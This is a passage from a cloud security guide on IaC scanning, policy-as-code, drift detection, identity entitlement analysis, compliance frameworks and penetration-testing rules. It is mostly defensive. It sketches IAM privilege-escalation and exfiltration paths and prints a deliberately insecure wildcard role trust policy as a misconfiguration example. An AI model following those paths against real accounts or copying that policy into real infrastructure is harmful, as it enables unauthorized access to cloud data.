resource "aws_s3_bucket_versioning" "secure" {
  bucket = aws_s3_bucket.secure.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_logging" "secure" {
  bucket        = aws_s3_bucket.secure.id
  target_bucket = var.logging_bucket_id
  target_prefix = "s3-access-logs/${var.bucket_name}/"
}
```

The same security posture for Azure and GCP storage would be defined in parallel modules, ensuring consistency through a common interface.

### 5.5 Centralized Logging and Correlation

Aggregating logs from multiple clouds into a single SIEM or data lake enables cross-cloud correlation. Architecture pattern:

```
AWS CloudTrail ─────────> S3 ──────┐
                                    │
Azure Activity Log ──> Event Hub ──┼──> Centralized SIEM
                                    │    (Sentinel, Splunk,
GCP Cloud Audit Logs ──> Pub/Sub ──┘     Elastic, Chronicle)
```

Key design decisions:

- **Log format normalization:** Map all three providers to a common schema (ECS, OCSF, or custom)
- **Timestamp synchronization:** All clouds use UTC, but event delivery latency varies (CloudTrail can lag 5-15 minutes)
- **Cross-cloud correlation identifiers:** Use consistent tagging (e.g., same user email across providers) to correlate events
- **Retention alignment:** Ensure all clouds retain logs for the same duration to prevent forensic gaps

### 5.6 Cost of Multi-Cloud Security Tooling

Multi-cloud security comes at a significant cost premium. Commercial CNAPP pricing models typically charge per-resource or per-workload, and costs scale linearly with cloud footprint:

| Tool Category | Typical Cost Model | Annual Cost Range (500 workloads) |
|--------------|-------------------|----------------------------------|
| Commercial CNAPP (Wiz, Prisma) | Per-workload/resource | $75,000 - $250,000 |
| Cloud-native CSPM (Security Hub, Defender) | Per-assessment/per-resource | $15,000 - $50,000 per cloud |
| Open-source (Prowler, ScoutSuite) | Labor cost only | $0 (tool) + FTE time |
| SIEM for log aggregation | Per GB ingested | $50,000 - $500,000+ |

Organizations must weigh the cost of commercial tooling against the risk of misconfiguration-driven breaches. The average cost of a cloud data breach exceeds $4.5M (IBM Cost of a Data Breach Report 2025), making a $200K CNAPP investment economically rational for organizations with significant cloud footprints.

---

## 6. Infrastructure as Code Security

### 6.1 Pre-Deployment Scanning

IaC scanning tools analyze Terraform, CloudFormation, ARM templates, Kubernetes manifests, Dockerfiles, and Helm charts before deployment to catch misconfigurations statically.

| Tool | Languages/Formats | Policy Source | Output |
|------|-------------------|---------------|--------|
| **Checkov** (Bridgecrew/Prisma) | Terraform, CFN, K8s, ARM, Serverless, Dockerfile | Built-in (1000+ checks) + custom YAML/Python | CLI, SARIF, JUnit, JSON |
| **tfsec** (now trivy) | Terraform, CloudFormation | Built-in + custom Rego | CLI, SARIF, JSON |
| **KICS** (Checkmarx) | Terraform, CFN, ARM, K8s, Docker, Ansible, Helm | Built-in Rego queries | CLI, SARIF, HTML |
| **Terrascan** (Tenable) | Terraform, K8s, ARM, CFN, Dockerfile, Helm | Built-in + custom Rego | CLI, SARIF, JSON |
| **Snyk IaC** | Terraform, CFN, K8s, ARM | Snyk policy database | CLI, Snyk UI |

**Checkov usage example:**

```bash
# Scan a Terraform directory
checkov -d ./terraform/ --framework terraform --output cli

# Scan with custom check
checkov -d ./terraform/ --external-checks-dir ./custom-checks/

# Scan and output SARIF for CI integration
checkov -d ./terraform/ --output sarif --output-file results.sarif

# Skip specific checks
checkov -d ./terraform/ --skip-check CKV_AWS_18,CKV_AWS_21

# Example output:
# Passed checks: 45, Failed checks: 3, Skipped checks: 0
#
# Check: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"
#   FAILED for resource: aws_s3_bucket.data
#   File: /main.tf:12-18
#   Guide: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/...
```

### 6.2 Policy-as-Code

Policy-as-code frameworks allow security teams to define governance rules programmatically and evaluate them against infrastructure definitions or live resources.

**Open Policy Agent (OPA) with Rego:**

```rego
# terraform_security.rego — Enforce security baselines on Terraform plans
package terraform.security

import rego.v1

# Deny S3 buckets without encryption
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_s3_bucket"
    not has_encryption(resource.values.bucket)
    msg := sprintf("S3 bucket '%s' missing server-side encryption configuration", [resource.values.bucket])
}

# Deny security groups with unrestricted SSH
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_security_group"
    ingress := resource.values.ingress[_]
    ingress.from_port <= 22
    ingress.to_port >= 22
    cidr := ingress.cidr_blocks[_]
    cidr == "0.0.0.0/0"
    msg := sprintf("Security group '%s' allows SSH from 0.0.0.0/0", [resource.values.name])
}

# Deny EC2 instances without IMDSv2
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_instance"
    metadata := resource.values.metadata_options[_]
    metadata.http_tokens != "required"
    msg := sprintf("EC2 instance '%s' does not enforce IMDSv2", [resource.address])
}

has_encryption(bucket_name) if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_s3_bucket_server_side_encryption_configuration"
    resource.values.bucket == bucket_name
}
```

**Evaluating a Terraform plan against OPA:**

```bash
# Generate Terraform plan as JSON
terraform plan -out=tfplan
terraform show -json tfplan > tfplan.json

# Evaluate with OPA
opa eval --data terraform_security.rego --input tfplan.json "data.terraform.security.deny"

# In CI pipeline — fail if any denials
DENIALS=$(opa eval --data terraform_security.rego --input tfplan.json \
  "data.terraform.security.deny" --format raw)
if [ "$DENIALS" != "[]" ]; then
  echo "Policy violations found: $DENIALS"
  exit 1
fi
```

**AWS CloudFormation Guard:**

```
# cfn-guard rules for S3 encryption
let s3_buckets = Resources.*[ Type == 'AWS::S3::Bucket' ]

rule s3_encryption_check when %s3_buckets !empty {
    %s3_buckets.Properties.BucketEncryption.ServerSideEncryptionConfiguration[*] {
        ServerSideEncryptionByDefault.SSEAlgorithm in ['aws:kms', 'AES256']
    }
}

rule s3_public_access_block when %s3_buckets !empty {
    %s3_buckets.Properties {
        PublicAccessBlockConfiguration exists
        PublicAccessBlockConfiguration.BlockPublicAcls == true
        PublicAccessBlockConfiguration.BlockPublicPolicy == true
    }
}
```

### 6.3 Drift Detection

Configuration drift occurs when live cloud resources diverge from their IaC definitions. Common causes:

- Manual changes via the console ("ClickOps")
- Emergency hotfixes applied directly to production
- Automation scripts that modify resources outside Terraform state
- Cloud provider automatic updates (e.g., RDS engine upgrades)

**Drift detection tools:**

```bash
# Terraform native drift detection
terraform plan -refresh-only -detailed-exitcode
# Exit code 0 = no drift, 2 = drift detected

# driftctl (now part of Snyk) — comprehensive drift analysis
driftctl scan --from tfstate://terraform.tfstate \
  --to aws+tf \
  --output json://drift-report.json

# Example drift report output:
# Found 3 resource(s) with drift:
#   aws_security_group.web: ingress rule added (0.0.0.0/0 on port 8080)
#   aws_s3_bucket_policy.data: policy changed to allow public read
#   aws_iam_role.app: inline policy added with s3:*
```

Drift in security-critical resources (IAM policies, network rules, encryption settings) should trigger immediate alerts, not just periodic reports.

### 6.4 Remediation-as-Code

When CSPM tools detect misconfigurations, automated remediation applies IaC to fix them:

```python
# auto_remediate_public_s3.py — Lambda triggered by Security Hub finding
import boto3
import json

def handler(event, context):
    s3_client = boto3.client('s3')

    for finding in event['detail']['findings']:
        if finding['Title'] != 'S3.2 S3 buckets should prohibit public read access':
            continue

        resource_arn = finding['Resources'][0]['Id']
        bucket_name = resource_arn.split(':::')[1]

        # Apply public access block
        s3_client.put_public_access_block(
            Bucket=bucket_name,
            PublicAccessBlockConfiguration={
                'BlockPublicAcls': True,
                'IgnorePublicAcls': True,
                'BlockPublicPolicy': True,
                'RestrictPublicBuckets': True
            }
        )

        print(f"Remediated public access on bucket: {bucket_name}")

        # Update finding workflow status
        securityhub = boto3.client('securityhub')
        securityhub.batch_update_findings(
            FindingIdentifiers=[{
                'Id': finding['Id'],
                'ProductArn': finding['ProductArn']
            }],
            Workflow={'Status': 'RESOLVED'},
            Note={
                'Text': f'Auto-remediated: public access blocked on {bucket_name}',
                'UpdatedBy': 'auto-remediation-lambda'
            }
        )

    return {'statusCode': 200}
```

### 6.5 IaC in CI/CD — Blocking Non-Compliant Deployments

A mature IaC security pipeline gates deployments on policy compliance:

```yaml
# .github/workflows/terraform-security.yml
name: Terraform Security Pipeline

on:
  pull_request:
    paths: ['terraform/**']

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: 1.9.x

      - name: Terraform Init
        run: terraform -chdir=terraform init -backend=false

      - name: Terraform Validate
        run: terraform -chdir=terraform validate

      - name: Checkov Scan
        uses: bridgecrewio/checkov-action@v12
        with:
          directory: terraform/
          framework: terraform
          output_format: sarif
          soft_fail: false  # BLOCK on failures

      - name: Terraform Plan
        run: |
          terraform -chdir=terraform plan -out=tfplan
          terraform -chdir=terraform show -json tfplan > tfplan.json

      - name: OPA Policy Check
        run: |
          opa eval --data policies/ --input tfplan.json \
            "data.terraform.security.deny" --format json > opa-results.json
          VIOLATIONS=$(jq '.result[0].expressions[0].value | length' opa-results.json)
          if [ "$VIOLATIONS" -gt 0 ]; then
            echo "OPA policy violations detected:"
            jq '.result[0].expressions[0].value' opa-results.json
            exit 1
          fi
```

### 6.6 Template Hardening — CIS AWS Foundations Terraform

CIS AWS Foundations Benchmark implemented as reusable Terraform modules:

```hcl
# modules/cis-foundations/cloudtrail.tf
resource "aws_cloudtrail" "org_trail" {
  name                          = "org-security-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail.id
  include_global_service_events = true
  is_multi_region_trail         = true
  is_organization_trail         = true
  enable_log_file_validation    = true
  kms_key_id                    = aws_kms_key.cloudtrail.arn
  cloud_watch_logs_group_arn    = "${aws_cloudwatch_log_group.cloudtrail.arn}:*"
  cloud_watch_logs_role_arn     = aws_iam_role.cloudtrail_cloudwatch.arn

  event_selector {
    read_write_type           = "All"
    include_management_events = true

    data_resource {
      type   = "AWS::S3::Object"
      values = ["arn:aws:s3"]
    }
  }

  insight_selector {
    insight_type = "ApiCallRateInsight"
  }

  insight_selector {
    insight_type = "ApiErrorRateInsight"
  }
}

# modules/cis-foundations/password-policy.tf
resource "aws_iam_account_password_policy" "cis" {
  minimum_password_length        = 14
  require_lowercase_characters   = true
  require_uppercase_characters   = true
  require_numbers                = true
  require_symbols                = true
  allow_users_to_change_password = true
  max_password_age               = 90
  password_reuse_prevention      = 24
}

# modules/cis-foundations/config.tf
resource "aws_config_configuration_recorder" "main" {
  name     = "default"
  role_arn = aws_iam_role.config.arn

  recording_group {
    all_supported                 = true
    include_global_resource_types = true
  }
}

resource "aws_config_delivery_channel" "main" {
  name           = "default"
  s3_bucket_name = aws_s3_bucket.config.id

  snapshot_delivery_properties {
    delivery_frequency = "TwentyFour_Hours"
  }

  depends_on = [aws_config_configuration_recorder.main]
}

resource "aws_config_configuration_recorder_status" "main" {
  name       = aws_config_configuration_recorder.main.name
  is_enabled = true

  depends_on = [aws_config_delivery_channel.main]
}
```

---

## 7. Cloud Identity Security — CIEM

### 7.1 Overprivileged Identities as Top Risk

Cloud identity and entitlement management (CIEM) addresses what multiple industry reports identify as the single largest cloud security risk: overprivileged identities. The problem manifests in several ways:

**Permission explosion:** AWS alone has over 15,000 distinct IAM actions across 300+ services. Administrators granting permissions face an overwhelming choice space. The path of least resistance is to grant broader permissions than needed — `AdministratorAccess` instead of a precisely scoped custom policy.

**Permission accumulation:** Identities accumulate permissions over time as they move between teams, take on temporary projects, and access new services. Permissions are rarely revoked because no one tracks what is actually used vs. what was granted.

**Machine identity proliferation:** In cloud environments, machine identities (service accounts, IAM roles, managed identities, service principals) outnumber human users by 10:1 or more. These identities often receive broad permissions during development and are never tightened for production.

**Quantifying the problem:**

| Metric | Typical Finding | Target |
|--------|----------------|--------|
| Percentage of permissions actually used | 5-10% of granted permissions | < 20% overprivilege ratio |
| Service accounts with admin-equivalent | 15-25% in unmanaged environments | 0% |
| Cross-account roles with external trust | Often undocumented | 100% documented and justified |
| Users without MFA on privileged accounts | 10-30% | 0% |
| Stale credentials (unused > 90 days) | 20-40% of total credentials | < 5% |

### 7.2 Effective Permissions Analysis

Effective permissions in cloud environments are the intersection of multiple policy layers. In AWS, the effective permission of an API call involves evaluating:

```
Request Decision = Evaluate(
    Identity-based policies (user/role policies)
  ∩ Resource-based policies (S3 bucket policy, KMS key policy)
  ∩ Permission boundaries (if set)
  ∩ Service Control Policies (if in AWS Organizations)
  ∩ Session policies (if using STS)
  ∩ Access Control Lists (legacy, for S3/VPC)
  ∩ VPC endpoint policies (if accessing via VPC endpoint)
)
```

An explicit `Deny` at any layer overrides all `Allow` statements. This layered model makes it extremely difficult to determine actual permissions without automated tooling.

**Python boto3 script for analyzing unused permissions:**

```python
# analyze_iam_permissions.py — Compare granted vs used permissions
import boto3
import json
from datetime import datetime, timedelta, timezone

def analyze_role_permissions(role_name, days_lookback=90):
    iam = boto3.client('iam')
    cloudtrail = boto3.client('cloudtrail')

    # Get all policies attached to the role
    granted_actions = set()

    # Inline policies
    inline_policies = iam.list_role_policies(RoleName=role_name)['PolicyNames']
    for policy_name in inline_policies:
        policy_doc = iam.get_role_policy(RoleName=role_name, PolicyName=policy_name)
        doc = policy_doc['PolicyDocument']
        for stmt in doc.get('Statement', []):
            if stmt.get('Effect') == 'Allow':
                actions = stmt.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                granted_actions.update(actions)

    # Managed policies
    attached_policies = iam.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']
    for policy in attached_policies:
        policy_version = iam.get_policy(PolicyArn=policy['PolicyArn'])['Policy']['DefaultVersionId']
        policy_doc = iam.get_policy_version(
            PolicyArn=policy['PolicyArn'],
            VersionId=policy_version
        )['PolicyVersion']['Document']
        for stmt in policy_doc.get('Statement', []):
            if stmt.get('Effect') == 'Allow':
                actions = stmt.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                granted_actions.update(actions)

    # Get actually used actions from CloudTrail
    used_actions = set()
    start_time = datetime.now(timezone.utc) - timedelta(days=days_lookback)

    paginator = cloudtrail.get_paginator('lookup_events')
    for page in paginator.paginate(
        LookupAttributes=[{
            'AttributeKey': 'ResourceType',
            'AttributeValue': 'AWS::IAM::Role'
        }],
        StartTime=start_time,
        EndTime=datetime.now(timezone.utc)
    ):
        for event in page['Events']:
            event_data = json.loads(event['CloudTrailEvent'])
            if event_data.get('userIdentity', {}).get('sessionContext', {}).get(
                'sessionIssuer', {}).get('arn', '').endswith(f'role/{role_name}'):
                source = event_data.get('eventSource', '').replace('.amazonaws.com', '')
                action = event_data.get('eventName', '')
                used_actions.add(f"{source}:{action}")

    unused_actions = granted_actions - used_actions
    wildcard_grants = [a for a in granted_actions if '*' in a]

    return {
        'role_name': role_name,
        'granted_count': len(granted_actions),
        'used_count': len(used_actions),
        'unused_count': len(unused_actions),
        'overprivilege_ratio': round(len(unused_actions) / max(len(granted_actions), 1) * 100, 1),
        'wildcard_grants': wildcard_grants,
        'unused_actions': sorted(unused_actions)[:20],  # Top 20 for brevity
        'used_actions': sorted(used_actions)
    }

if __name__ == '__main__':
    import sys
    role = sys.argv[1] if len(sys.argv) > 1 else 'AppRole'
    result = analyze_role_permissions(role)
    print(json.dumps(result, indent=2, default=str))
```

### 7.3 Permission Boundaries and SCPs

**Permission Boundaries** (AWS) set a maximum permission ceiling for IAM entities. They do not grant permissions; they restrict what identity-based policies can grant.

Use cases:
- Allowing developers to create IAM roles without granting themselves admin (the boundary constrains what the created roles can do)
- Preventing privilege escalation — even if a role has `iam:*`, the boundary blocks actions outside its scope

```hcl
# permission_boundary.tf — Restrict developer-created roles
resource "aws_iam_policy" "dev_boundary" {
  name = "DeveloperPermissionBoundary"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowedServices"
        Effect = "Allow"
        Action = [
          "s3:*",
          "dynamodb:*",
          "lambda:*",
          "logs:*",
          "sqs:*",
          "sns:*",
          "cloudwatch:*"
        ]
        Resource = "*"
      },
      {
        Sid    = "DenyIAMEscalation"
        Effect = "Deny"
        Action = [
          "iam:CreateUser",
          "iam:CreateRole",
          "iam:PutRolePolicy",
          "iam:AttachRolePolicy",
          "iam:DeleteRolePolicy",
          "iam:DetachRolePolicy",
          "organizations:*",
          "account:*"
        ]
        Resource = "*"
      }
    ]
  })
}
```

**Service Control Policies (SCPs)** operate at the AWS Organizations level and apply guardrails across all accounts in an OU or the entire organization:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyLeaveOrg",
      "Effect": "Deny",
      "Action": "organizations:LeaveOrganization",
      "Resource": "*"
    },
    {
      "Sid": "DenyDisableCloudTrail",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:StopLogging",
        "cloudtrail:DeleteTrail",
        "cloudtrail:UpdateTrail"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/SecurityAdminRole"
        }
      }
    },
    {
      "Sid": "DenyRootUser",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:root"
        }
      }
    },
    {
      "Sid": "DenyRegionsOutsideEU",
      "Effect": "Deny",
      "NotAction": [
        "iam:*",
        "sts:*",
        "organizations:*",
        "support:*",
        "budgets:*"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": ["eu-west-1", "eu-central-1"]
        }
      }
    }
  ]
}
```

### 7.4 Identity Attack Paths

CIEM tools like Wiz and Ermetic build identity graphs that map the chain of permissions from one identity to another, revealing attack paths that no single IAM policy review would catch.

Example attack path:

```
Developer Role (has iam:PassRole)
    └── Can pass Role-X to Lambda
        └── Role-X has s3:GetObject on production-data bucket
            └── Lambda execution = data exfiltration

Another path:
EC2 Instance Profile (has ssm:SendCommand)
    └── Can run commands on any EC2 in the account
        └── Target EC2 has IAM role with SecretsManager:GetSecretValue
            └── Lateral movement to secrets
```

These multi-hop paths are invisible to traditional policy reviews that examine one policy at a time.

### 7.5 Service Principal and Managed Identity Auditing

In Azure, service principals and managed identities are primary targets for attackers because:

- System-assigned managed identities are tied to resources and cannot have MFA
- User-assigned managed identities can be shared across resources, creating lateral movement paths
- Service principal credentials (certificates, client secrets) may have multi-year lifetimes
- App registrations with high-privilege API permissions can grant access to Microsoft Graph, Key Vault, and more

Audit queries:

```bash
# Azure: List all service principals with high-privilege app roles
az ad sp list --all --query "[?appRoles[?value=='Application.ReadWrite.All' || value=='Directory.ReadWrite.All']].{Name:displayName, AppId:appId}" --output table

# Azure: Find managed identities with Contributor role
az role assignment list --all --query "[?principalType=='ServicePrincipal' && roleDefinitionName=='Contributor'].{Principal:principalName, Scope:scope}" --output table
```

### 7.6 Cross-Account Access Risks

AWS IAM role trust policies can allow any AWS account to assume a role if the trust policy is misconfigured:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "*"},
    "Action": "sts:AssumeRole"
  }]
}
```

This trust policy allows **any AWS account in existence** to assume the role. IAM Access Analyzer catches this, but many organizations do not enable it. The correct pattern specifies exact account IDs and optionally requires an external ID:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::111111111111:root"},
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "unique-secret-per-trust"
      }
    }
  }]
}
```

### 7.7 Unused Permissions Removal Workflow

A systematic approach to right-sizing permissions:

1. **Inventory:** Enumerate all identities and their granted permissions (IAM Access Analyzer, custom scripts)
2. **Baseline:** Analyze CloudTrail/Azure Activity Logs/Cloud Audit Logs for 60-90 days of actual usage
3. **Compare:** Identify permissions granted but never used during the baseline period
4. **Classify:** Categorize unused permissions by risk level (admin-level unused > read-only unused)
5. **Propose:** Generate least-privilege policies based on actual usage (IAM Access Analyzer policy generation)
6. **Test:** Apply proposed policies in audit mode (AWS: policy simulator; Azure: what-if; GCP: dry-run)
7. **Implement:** Replace overprivileged policies with right-sized versions
8. **Monitor:** Continue monitoring for new permissions that become unused

---

## 8. Compliance Frameworks in Cloud

### 8.1 CIS Benchmarks for AWS, Azure, GCP

The Center for Internet Security publishes cloud-specific benchmarks with two profiles:

| Profile | Target | Strictness |
|---------|--------|-----------|
| Level 1 | All organizations | Practical, minimal business impact |
| Level 2 | High-security environments | Stricter, may impact functionality |

**CIS AWS Foundations Benchmark v3.0 — Key Controls:**

| Section | Control | Level |
|---------|---------|-------|
| 1.1 | Maintain current contact details | L1 |
| 1.4 | Ensure no root user access key exists | L1 |
| 1.5 | Ensure MFA is enabled for root user | L1 |
| 1.10 | Ensure multi-factor authentication (MFA) is enabled for all IAM users | L1 |
| 1.14 | Ensure access keys are rotated every 90 days or less | L1 |
| 1.16 | Ensure IAM policies that allow full `*:*` administrative privileges are not attached | L1 |
| 2.1.1 | Ensure S3 Bucket Policy is set to deny HTTP requests | L2 |
| 2.1.2 | Ensure MFA Delete is enabled on S3 buckets | L2 |
| 3.1 | Ensure CloudTrail is enabled in all regions | L1 |
| 3.4 | Ensure CloudTrail log file validation is enabled | L1 |
| 4.3 | Ensure a log metric filter and alarm exist for root account usage | L1 |
| 5.1 | Ensure no Network ACLs allow ingress from 0.0.0.0/0 to port 22 | L1 |
| 5.4 | Ensure the default security group restricts all traffic | L2 |

**Automated checking with Prowler:**

```bash
# Run CIS AWS Foundations Benchmark
prowler aws --compliance cis_3.0_aws

# Run specific CIS section
prowler aws --compliance cis_3.0_aws --checks-folder checks/

# Run with specific profile and region
prowler aws --profile security-audit --region eu-west-1 \
  --compliance cis_3.0_aws --output-formats json-ocsf csv html

# Run CIS Azure Foundations
prowler azure --compliance cis_2.1_azure --subscription-ids SUB_ID

# Run CIS GCP Foundations
prowler gcp --compliance cis_2.0_gcp --project-ids PROJECT_ID
```

### 8.2 SOC 2 Cloud Controls Mapping

SOC 2 Type II audits evaluate controls across five Trust Service Criteria. Mapping these to cloud-native controls:

| Trust Criteria | Control Objective | AWS Native Control | Azure Native Control |
|---------------|-------------------|-------------------|---------------------|
| **Security** | Access control | IAM policies, MFA, SCPs | RBAC, Conditional Access, PIM |
| **Security** | Network protection | Security Groups, NACLs, WAF | NSGs, Azure Firewall, WAF |
| **Security** | Encryption | KMS, ACM, S3 encryption | Key Vault, TDE, Storage encryption |
| **Availability** | Redundancy | Multi-AZ, Auto Scaling | Availability Zones, VMSS |
| **Availability** | DR | Cross-region replication, Backup | Site Recovery, Geo-replication |
| **Processing Integrity** | Data validation | Lambda validation, API Gateway | Logic Apps, API Management |
| **Confidentiality** | Data classification | Macie, Resource tags | Purview, Sensitivity Labels |
| **Privacy** | Data retention | S3 Lifecycle, DynamoDB TTL | Blob Lifecycle, Retention Policies |

### 8.3 PCI-DSS in Cloud

PCI-DSS v4.0 requirements mapped to the shared responsibility boundary:

| Requirement | Cloud Provider Responsibility | Customer Responsibility |
|-------------|------------------------------|------------------------|
| Req 1: Network security controls | Physical network infrastructure | Security Groups, NACLs, WAF rules, VPC design |
| Req 2: Secure configurations | Hypervisor, physical host configs | OS hardening, application configuration, CIS baselines |
| Req 3: Protect stored account data | Physical media encryption | Application-level encryption, key management, tokenization |
| Req 4: Protect data in transit | Provider-to-provider TLS | Application TLS, certificate management, HSTS |
| Req 6: Secure systems and software | Provider service patching | Application code security, dependency management, WAF rules |
| Req 7: Restrict access | Physical access controls | IAM policies, least privilege, access reviews |
| Req 8: Identify and authenticate users | MFA for provider console | Application-level authentication, session management |
| Req 10: Log and monitor | Infrastructure logging | CloudTrail, application logging, SIEM integration |
| Req 11: Test security | Provider pen tests (SOC 2) | Customer penetration testing, vulnerability scanning |
| Req 12: Security policies | Provider security program | Organizational policies, training, incident response |

The Cardholder Data Environment (CDE) in cloud must be isolated in a dedicated VPC/VNet with strict network controls, encrypted at rest and in transit, and monitored with 12 months of log retention.

### 8.4 HIPAA Cloud Compliance

HIPAA requires Business Associate Agreements (BAAs) with cloud providers. AWS, Azure, and GCP all offer BAAs, but the customer is responsible for:

- Encrypting all PHI at rest and in transit (not optional in cloud)
- Implementing access controls with audit logging on PHI access
- Enabling CloudTrail/Activity Log with 6-year retention for PHI-related operations
- Configuring backup and disaster recovery for PHI data stores
- Implementing breach notification within 60 days

AWS HIPAA-eligible services are explicitly listed; using a non-eligible service for PHI violates the BAA. The same applies to Azure and GCP.

### 8.5 FedRAMP

FedRAMP (Federal Risk and Authorization Management Program) authorizes cloud services for U.S. federal government use at three impact levels:

| Level | Data Sensitivity | Controls | Timeline |
|-------|-----------------|----------|----------|
| Low | Public, non-sensitive | 125 controls | 6-12 months |
| Moderate | CUI, PII, law enforcement | 325 controls | 12-18 months |
| High | National security, classified | 421 controls | 18-24 months |

AWS GovCloud, Azure Government, and Google Cloud for Government maintain FedRAMP High authorizations. Commercial regions typically hold FedRAMP Moderate.

### 8.6 Custom Compliance Frameworks

Organizations often need internal compliance standards that blend industry frameworks with business-specific requirements. CSPM platforms support custom frameworks:

```yaml
# custom_framework.yaml — Organization-specific security standard
framework:
  name: "ACME Corp Cloud Security Standard v2.0"
  version: "2.0"
  categories:
    - name: "Identity & Access"
      controls:
        - id: "ACME-IAM-001"
          title: "No wildcard IAM policies"
          severity: "CRITICAL"
          check: "iam-no-star-star"
          cis_mapping: "CIS AWS 1.16"
        - id: "ACME-IAM-002"
          title: "MFA on all human identities"
          severity: "CRITICAL"
          check: "iam-mfa-all-users"
          soc2_mapping: "CC6.1"
    - name: "Data Protection"
      controls:
        - id: "ACME-DATA-001"
          title: "Encryption at rest with CMK"
          severity: "HIGH"
          check: "encryption-cmk-all-storage"
          pci_mapping: "Req 3.4"
        - id: "ACME-DATA-002"
          title: "No public data stores"
          severity: "CRITICAL"
          check: "no-public-storage"
          hipaa_mapping: "164.312(a)(1)"
    - name: "Logging & Monitoring"
      controls:
        - id: "ACME-LOG-001"
          title: "CloudTrail enabled all regions"
          severity: "CRITICAL"
          check: "cloudtrail-multiregion"
          cis_mapping: "CIS AWS 3.1"
```

### 8.7 Evidence Collection Automation

Compliance audits require evidence artifacts. Automating evidence collection reduces audit preparation from weeks to hours:

```python
# collect_compliance_evidence.py — Automated evidence gathering
import boto3
import json
from datetime import datetime, timezone

def collect_evidence(output_dir='/tmp/evidence'):
    evidence = {}
    timestamp = datetime.now(timezone.utc).isoformat()

    iam = boto3.client('iam')
    s3 = boto3.client('s3')
    config = boto3.client('config')
    securityhub = boto3.client('securityhub')

    # Evidence 1: Password policy (CIS 1.8-1.14)
    try:
        password_policy = iam.get_account_password_policy()['PasswordPolicy']
        evidence['password_policy'] = {
            'timestamp': timestamp,
            'control': 'CIS AWS 1.8-1.14',
            'data': password_policy,
            'compliant': (
                password_policy.get('MinimumPasswordLength', 0) >= 14
                and password_policy.get('RequireSymbols', False)
                and password_policy.get('RequireNumbers', False)
                and password_policy.get('RequireUppercaseCharacters', False)
                and password_policy.get('RequireLowercaseCharacters', False)
                and password_policy.get('MaxPasswordAge', 999) <= 90
            )
        }
    except iam.exceptions.NoSuchEntityException:
        evidence['password_policy'] = {
            'timestamp': timestamp,
            'control': 'CIS AWS 1.8-1.14',
            'data': None,
            'compliant': False,
            'note': 'No password policy configured'
        }

    # Evidence 2: S3 public access block (CIS 2.1.5)
    try:
        public_access = s3.get_public_access_block(
            AccountId=boto3.client('sts').get_caller_identity()['Account']
        )['PublicAccessBlockConfiguration']
        evidence['s3_account_public_block'] = {
            'timestamp': timestamp,
            'control': 'CIS AWS 2.1.5',
            'data': public_access,
            'compliant': all([
                public_access.get('BlockPublicAcls', False),
                public_access.get('IgnorePublicAcls', False),
                public_access.get('BlockPublicPolicy', False),
                public_access.get('RestrictPublicBuckets', False)
            ])
        }
    except Exception as e:
        evidence['s3_account_public_block'] = {
            'timestamp': timestamp,
            'control': 'CIS AWS 2.1.5',
            'compliant': False,
            'error': str(e)
        }

    # Evidence 3: Security Hub compliance score
    try:
        standards = securityhub.get_enabled_standards()['StandardsSubscriptions']
        for std in standards:
            controls = securityhub.describe_standards_controls(
                StandardsSubscriptionArn=std['StandardsSubscriptionArn']
            )['Controls']
            passed = sum(1 for c in controls if c['ComplianceStatus'] == 'PASSED')
            failed = sum(1 for c in controls if c['ComplianceStatus'] == 'FAILED')
            evidence[f"securityhub_{std['StandardsArn'].split('/')[-1]}"] = {
                'timestamp': timestamp,
                'standard': std['StandardsArn'],
                'passed': passed,
                'failed': failed,
                'compliance_pct': round(passed / max(passed + failed, 1) * 100, 1)
            }
    except Exception as e:
        evidence['securityhub'] = {'error': str(e)}

    with open(f"{output_dir}/evidence_{datetime.now(timezone.utc).strftime('%Y%m%d')}.json", 'w') as f:
        json.dump(evidence, f, indent=2, default=str)

    return evidence

if __name__ == '__main__':
    results = collect_evidence()
    for control, data in results.items():
        status = 'PASS' if data.get('compliant') else 'FAIL'
        print(f"[{status}] {control}: {data.get('control', 'N/A')}")
```

---

## 9. Cloud Penetration Testing

### 9.1 AWS Penetration Testing Policy

AWS permits penetration testing against resources owned by the customer without prior approval for the following services: EC2, RDS, Aurora, CloudFront, API Gateway, Lambda, Lightsail, Elastic Beanstalk, ECS, Fargate, Elasticsearch/OpenSearch, AppSync, and S3 (application-level testing only). Prohibited activities include:

- DNS zone walking against Route 53
- Denial of service (DoS/DDoS) attacks or simulated attacks
- Port/protocol/request flooding
- Testing AWS infrastructure itself (the shared responsibility boundary applies)

### 9.2 Azure and GCP Penetration Testing Rules

**Azure:** Microsoft removed the requirement for pre-approval in 2017. Customers may test their own Azure-hosted applications following the Microsoft Cloud Unified Penetration Testing Rules of Engagement. Prohibited: testing other tenants, DDoS simulation (use Azure DDoS Protection simulation via approved partners), social engineering of Microsoft employees.

